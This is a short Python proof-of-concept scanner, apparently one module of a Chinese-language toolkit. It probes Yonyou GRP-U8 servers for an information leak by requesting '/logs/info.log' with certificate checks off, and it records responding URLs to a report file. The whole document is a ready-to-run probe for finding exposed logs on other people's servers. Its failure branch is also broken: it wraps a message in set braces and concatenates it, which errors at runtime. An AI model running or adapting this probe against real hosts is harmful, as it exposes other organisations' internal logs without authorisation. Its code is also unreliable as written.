import requests
import time
import buter
filename = "./reps/用友grp-u8信息泄露-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

def syguxxl(url):
    poc = '/logs/info.log'

    try:
        reps = requests.get(url=url+poc, headers=headers, verify=False, timeout=3)
        if reps.status_code == 200:
                print(buter.colors.GREEN+ f"存在用友grp-u8信息泄露 url : {url}{poc}" + buter.colors.END)
                f = open(filename, "a+", encoding="utf-8")
                f.write(reps.url)
                f.write("\n")
                f.close()
        else:
            print(buter.colors.RED + {f"未发现用友grp-u8信息泄露 url : {url}{poc}"}+buter.colors.END )
    except Exception as e:
        print(buter.colors.END+ f"ERROR : {e}"+buter.colors.END)
